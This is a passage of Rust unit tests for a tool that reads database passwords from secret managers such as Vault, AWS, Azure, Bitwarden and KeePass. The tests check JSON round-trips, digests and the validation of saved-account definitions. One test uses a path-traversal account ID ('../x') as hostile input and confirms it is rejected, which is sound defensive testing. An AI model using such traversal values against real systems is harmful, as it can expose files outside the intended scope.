            (r#"{"kind":"ccp","url":"https://ccp","app_id":"DBine","safe":"DB","folder":"Root","object":"pg","account_user":"u","account_address":"db","client_cert":"~/c.p12","client_key":"~/k.pem","ca_file":"~/ca.pem","fill_username":true}"#, "53d0f504f6755122d401bad9246ed323992415b5180f46f57c9e8fd53f4d1e4f"),
            (r#"{"kind":"delinea","url":"https://ss","platform_url":"https://t.delinea.app","username":"svc","domain":"CORP","secret_name":"pg","attribute":"pw","master":"ask","fill_username":true,"user_field":"user"}"#, "d024938e03e7b7e2419da116c34dada8d3c581ec55a99198ab7c3a73d89e20d7"),
            (r#"{"kind":"bitwarden","server":"","item":"pg","attribute":"pw","json_key":"k","client_id":"user.6f1c2a9e-0d1b-4c55-9a51-2f7d8c3b1e04","master":"command","master_command":"pass bw","fill_username":true,"user_field":"Login"}"#, "51c0655753230a2ceed685a6e73f8af0aeda3c09d0ec210706347c470e0f5910"),
            (r#"{"kind":"bitwarden","server":"bitwarden.eu","item":"pg","client_id":"user.6f1c2a9e-0d1b-4c55-9a51-2f7d8c3b1e04"}"#, "69932a4b50a84db48329a7312dbdbae515a54d23248ab98dbe6e5d15143e87bd"),
            (r#"{"kind":"bitwarden_sm","server":"","secret":"1c9d6c0e-55aa-4b6f-8a43-0a1b2c3d4e5f","json_key":"pw"}"#, "14566555096850214eedf2d7c20c9bf3783abf7bd25cc72f2a26d77b27efe179"),
            (r#"{"kind":"ssm","parameter":"/prod/db","version":"3","region":"eu-west-1","profile":"p","list_index":"2","json_key":"pw","fill_username":true}"#, "3ac8f487af28fc3b08713f21b837029c4930be6059571b4dd4d9124e08208503"),
        ];
        for (json, digest_before) in cases {
            let src: SecretSource = serde_json::from_str(json).unwrap();
            assert_eq!(serde_json::to_string(&src).unwrap(), json);
            assert_eq!(digest("c-1", "password", &src), digest_before, "{json}");
            assert_eq!(src.account(), None, "{json}");
            src.validate().unwrap_or_else(|e| panic!("{json}: {e}"));
        }
    }

    const ACCT: &str = "6f1c2d4e-0000-4000-8000-000000000001";

    /// A definition through a saved account of each kind: only what to read
    /// and the account's ID; nothing to keep for the field, no master of
    /// its own; mixed with a sign-in of its own, or a bad ID, it isn't valid.
    #[test]
    fn account_definitions_of_every_kind() {
        let cases = [
            (r#"{"kind":"onepassword","reference":"op://Private/DB/password","fill_username":true,"secret_account":"ID"}"#, r#""account":"my""#),
            (r#"{"kind":"vault","path":"secret/app","key":"pw","kv_version":"2","secret_account":"ID"}"#, r#""address":"https://v""#),
            (r#"{"kind":"vault_db","role":"ro","static_role":true,"secret_account":"ID"}"#, r#""namespace":"ns""#),
            (r#"{"kind":"aws","secret_id":"prod/db","json_key":"password","secret_account":"ID"}"#, r#""region":"us-east-1""#),
            (r#"{"kind":"ssm","parameter":"/prod/db","list_index":"2","secret_account":"ID"}"#, r#""profile":"p""#),
            (r#"{"kind":"azure","name":"db-pw","secret_account":"ID"}"#, r#""tenant":"contoso.onmicrosoft.com""#),
            (r#"{"kind":"gcp","secret":"db-pw","version":"3","secret_account":"ID"}"#, r#""project":"p""#),
            (r#"{"kind":"keepass","entry":"Databases/pg","fill_username":true,"secret_account":"ID"}"#, r#""master":"ask""#),
            (r#"{"kind":"conjur","variable":"db/pw","username_variable":"db/user","secret_account":"ID"}"#, r#""login":"host/x""#),
            (r#"{"kind":"ccp","safe":"DB","object":"pg","fill_username":true,"secret_account":"ID"}"#, r#""client_cert":"~/c.pem""#),
            (r#"{"kind":"delinea","secret_name":"pg","fill_username":true,"secret_account":"ID"}"#, r#""domain":"CORP""#),
            (r#"{"kind":"bitwarden","server":"","item":"pg","fill_username":true,"secret_account":"ID"}"#, r#""client_id":"user.6f1c2a9e-0d1b-4c55-9a51-2f7d8c3b1e04""#),
            (r#"{"kind":"bitwarden_sm","server":"","secret":"1c9d6c0e-55aa-4b6f-8a43-0a1b2c3d4e5f","secret_account":"ID"}"#, r#""server":"bitwarden.eu""#),
        ];
        for (json, sign_in) in cases {
            let json = json.replace("ID", ACCT);
            let src: SecretSource = serde_json::from_str(&json).unwrap();
            assert_eq!(serde_json::to_string(&src).unwrap(), json, "written as read");
            assert_eq!(src.account(), Some(ACCT));
            src.validate().unwrap_or_else(|e| panic!("{json}: {e}"));
            assert!(src.token_slots().is_empty(), "the account keeps the secrets: {json}");
            assert_eq!(src.master(), None);
            assert!(src.account_kind().is_some());
            // The account's ID is part of what's confirmed.
            let other: SecretSource = serde_json::from_str(&json.replace("0001", "0002")).unwrap();
            assert_ne!(digest("c", "password", &src), digest("c", "password", &other));
            // A sign-in of its own next to the account: not valid.
            let mixed = if sign_in.starts_with(r#""server""#) {
                json.replacen(r#""server":"""#, sign_in, 1)
            } else {
                json.replacen(r#""secret_account""#, &format!("{sign_in},\"secret_account\""), 1)
            };
            let mixed: SecretSource = serde_json::from_str(&mixed).unwrap_or_else(|e| panic!("{mixed}: {e}"));
            assert!(mixed.validate().is_err(), "{json} with {sign_in}");
            // A bad account ID.
            let bad: SecretSource = serde_json::from_str(&json.replace(ACCT, "../x")).unwrap();
            assert!(bad.validate().is_err());
        }
        // What to read is still checked.
        for bad in [
            r#"{"kind":"vault","path":"","key":"pw","secret_account":"ID"}"#,
            r#"{"kind":"azure","name":"a.b","secret_account":"ID"}"#,
            r#"{"kind":"bitwarden_sm","server":"","secret":"nope","secret_account":"ID"}"#,
            r#"{"kind":"ccp","secret_account":"ID"}"#,
        ] {
            let s: SecretSource = serde_json::from_str(&bad.replace("ID", ACCT)).unwrap();
            assert!(s.validate().is_err(), "{bad}");
        }
        assert_eq!(account_kind_of("vault_db"), Some("vault"));
        assert_eq!(account_kind_of("ssm"), Some("aws"));
        assert_eq!(account_kind_of("command"), None);
    }
}
